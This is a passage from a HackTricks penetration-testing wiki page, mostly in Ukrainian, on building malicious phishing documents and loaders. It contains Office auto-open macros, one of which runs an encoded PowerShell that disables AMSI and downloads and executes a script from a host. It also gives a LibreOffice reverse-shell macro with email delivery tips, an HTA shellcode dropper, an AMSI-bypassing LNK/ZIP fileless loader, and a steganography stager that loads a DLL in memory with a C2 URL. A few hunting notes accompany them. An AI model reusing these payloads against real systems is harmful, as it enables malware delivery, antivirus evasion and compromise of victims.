# Фішингові файли та документи

{{#include ../../banners/hacktricks-training.md}}

## Документи Office

Microsoft Word виконує валідацію даних файлу перед його відкриттям. Валідація даних здійснюється у вигляді ідентифікації структури даних відповідно до стандарту OfficeOpenXML. Якщо під час ідентифікації структури даних виникає будь-яка помилка, аналізований файл не буде відкрито.

Зазвичай файли Word, що містять макроси, використовують розширення `.docm`. Однак можливо перейменувати файл, змінивши розширення, і при цьому зберегти здатність макросів виконуватись.\
Наприклад, файл RTF за своєю конструкцією не підтримує макроси, але файл DOCM, перейменований на RTF, буде оброблятися Microsoft Word і буде здатний виконувати макроси.\
Ті самі внутрішні механізми застосовуються до всього програмного забезпечення Microsoft Office Suite (Excel, PowerPoint тощо).

Ви можете використати наступну команду, щоб перевірити, які розширення будуть виконуватися деякими програмами Office:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX files referencing a remote template (File –Options –Add-ins –Manage: Templates –Go) that includes macros can “execute” macros as well.

### Зовнішнє завантаження зображення

Go to: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Macros Backdoor

Можна використовувати macros для запуску довільного коду з документа.

#### Функції автозавантаження

Чим більш поширені вони, тим ймовірніше AV їх виявить.

- AutoOpen()
- Document_Open()

#### Macros Code Examples
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Ручне видалення метаданих

Перейдіть до **File > Info > Inspect Document > Inspect Document**, що відкриє Document Inspector. Натисніть **Inspect**, а потім **Remove All** поруч із **Document Properties and Personal Information**.

#### Розширення документа

Після цього оберіть випадаюче меню **Save as type**, змініть формат з **`.docx`** на **Word 97-2003 `.doc`**.\
Робіть це, тому що ви **не можете зберегти макроси всередині `.docx`** і існує **стигма** навколо макро-активованого розширення **`.docm`** (наприклад, мініатюра має великий `!`, і деякі веб/поштові шлюзи повністю блокують їх). Тому це **успадковане розширення `.doc` — найкращий компроміс**.

#### Генератори шкідливих макросів

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT макроси автозапуску (Basic)

Документи LibreOffice Writer можуть вбудовувати Basic макроси та автоматично виконувати їх при відкритті файлу, прив'язавши макрос до події **Open Document** (Tools → Customize → Events → Open Document → Macro…). Простий макрос reverse shell виглядає так:
```vb
Sub Shell
Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```
Зауважте подвійні лапки (`""`) всередині рядка — LibreOffice Basic використовує їх для екранування буквальних лапок, тому payloads, які закінчуються на `...==""")`, утримують баланс і внутрішньої команди, і аргумента Shell.

Поради з доставки:

- Збережіть як `.odt` і прив'яжіть макрос до події документа, щоб він спрацював одразу при відкритті.
- Під час відправлення пошти за допомогою `swaks` використовуйте `--attach @resume.odt` (символ `@` обов'язковий, щоб байти файлу, а не рядок імені файлу, були надіслані як вкладення). Це критично при використанні SMTP-серверів, які приймають довільних одержувачів `RCPT TO` без валідації.

## Файли HTA

An HTA is a Windows program that **combines HTML and scripting languages (such as VBScript and JScript)**. It generates the user interface and executes as a "fully trusted" application, without the constraints of a browser's security model.

An HTA is executed using **`mshta.exe`**, which is typically **installed** along with **Internet Explorer**, making **`mshta` dependant on IE**. So if it has been uninstalled, HTAs will be unable to execute.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Примусова автентифікація NTLM

Існує кілька способів **force NTLM authentication "remotely"**, наприклад, можна додати **невидимі зображення** в листи або HTML, до яких користувач отримає доступ (навіть HTTP MitM?). Або надіслати жертві **адресу файлів**, яка **trigger**-не **authentication** просто при **відкритті папки.**

**Перевірте ці ідеї та інші на наступних сторінках:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Не забувайте, що ви можете не лише вкрасти хеш або автентифікацію, а й **perform NTLM relay attacks**:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Дуже ефективні кампанії доставляють ZIP, який містить два легітимні приманкові документи (PDF/DOCX) та шкідливий .lnk. Суть у тому, що фактичний PowerShell loader зберігається в сирих байтах ZIP після унікального маркера, а .lnk вирізає та запускає його повністю в пам'яті.

Типовий потік, реалізований .lnk PowerShell one-liner:

1) Знайти оригінальний ZIP у стандартних шляхах: Desktop, Downloads, Documents, %TEMP%, %ProgramData% та у батьківській папці поточного робочого каталогу.
2) Прочитати байти ZIP і знайти жорстко закодований маркер (наприклад, xFIQCV). Все після маркера — це вбудований PowerShell payload.
3) Скопіювати ZIP в %ProgramData%, розпакувати там і відкрити приманковий .docx, щоб виглядало легітимно.
4) Bypass AMSI для поточного процесу: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Deobfuscate наступний етап (наприклад, видалити всі символи #) та виконати його в пам'яті.

Приклад PowerShell skeleton для витягнення та запуску вбудованого етапу:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Примітки
- Доставка часто зловживає авторитетними PaaS субдоменами (наприклад, *.herokuapp.com) і може блокувати payloads (подавати безпечні ZIPs залежно від IP/UA).
- На наступному етапі часто дешифрують base64/XOR shellcode та виконують його через Reflection.Emit + VirtualAlloc, щоб мінімізувати артефакти на диску.

Persistence, що використовується в тому ж ланцюжку
- COM TypeLib hijacking of the Microsoft Web Browser control так, щоб IE/Explorer або будь-який додаток, який його вбудовує, автоматично знову запускав payload. Див. деталі та готові до використання команди тут:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- ZIP файли, що містять ASCII маркер-рядок (наприклад, xFIQCV), доданий до даних архіву.
- .lnk, який перелічує батьківські/користувацькі папки для пошуку ZIP і відкриває документ-приманку.
- Маніпуляції AMSI через [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Тривало виконувані бізнес-потоки, що закінчуються посиланнями, розміщеними під довіреними PaaS доменами.

## Steganography-delimited payloads in images (PowerShell stager)

Останні ланцюжки loader доставляють обфускований JavaScript/VBS, який декодує і запускає Base64 PowerShell stager. Цей stager завантажує зображення (часто GIF), яке містить Base64-encoded .NET DLL, схований як plain text між унікальними маркерами початку/кінця. Скрипт шукає ці роздільники (приклади, помічені в реалі: «<<sudo_png>> … <<sudo_odt>>>»), витягує текст між ними, Base64-декодує його в байти, завантажує assembly в пам'ять і викликає відомий entry method з C2 URL.

Потік роботи
- Етап 1: Archived JS/VBS dropper → декодує вбудований Base64 → запускає PowerShell stager з -nop -w hidden -ep bypass.
- Етап 2: PowerShell stager → завантажує зображення, вирізає маркер-розмежований Base64, завантажує .NET DLL в пам'ять і викликає його метод (наприклад, VAI), передаючи C2 URL та опції.
- Етап 3: Loader отримує фінальний payload і зазвичай інжектить його через process hollowing у довірений бінар (зазвичай MSBuild.exe). Більше про process hollowing та trusted utility proxy execution дивіться тут:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

PowerShell example to carve a DLL from an image and invoke a .NET method in-memory:

<details>
<summary>PowerShell stego payload extractor and loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Примітки
- Це ATT&CK T1027.003 (steganography/marker-hiding). Маркери варіюються між кампаніями.
- AMSI/ETW bypass і деобфускація рядків зазвичай застосовуються перед завантаженням збірки.
- Hunting: скануйте завантажені зображення на відомі роздільники; виявляйте PowerShell, який звертається до зображень і негайно декодує Base64 блоки.

See also stego tools and carving techniques:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

Початковим, що повторюється, етапом є невеликий, сильно обфусцований `.js` або `.vbs`, доставлений всередині архіву. Його єдина мета — декодувати вбудований Base64 рядок і запустити PowerShell з `-nop -w hidden -ep bypass` для завантаження наступного етапу через HTTPS.

Загальна логіка (абстрактно):
- Прочитати власний вміст файлу
- Знайти Base64 blob між сміттєвими рядками
- Декодувати до ASCII PowerShell
- Виконати через `wscript.exe`/`cscript.exe`, викликаючи `powershell.exe`

Підказки для пошуку
- Архівовані вкладення JS/VBS, що породжують `powershell.exe` з `-enc`/`FromBase64String` у командному рядку.
- `wscript.exe`, що запускає `powershell.exe -nop -w hidden` з тимчасових шляхів користувача.

## Windows files to steal NTLM hashes

Перегляньте сторінку про **places to steal NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)

{{#include ../../banners/hacktricks-training.md}}
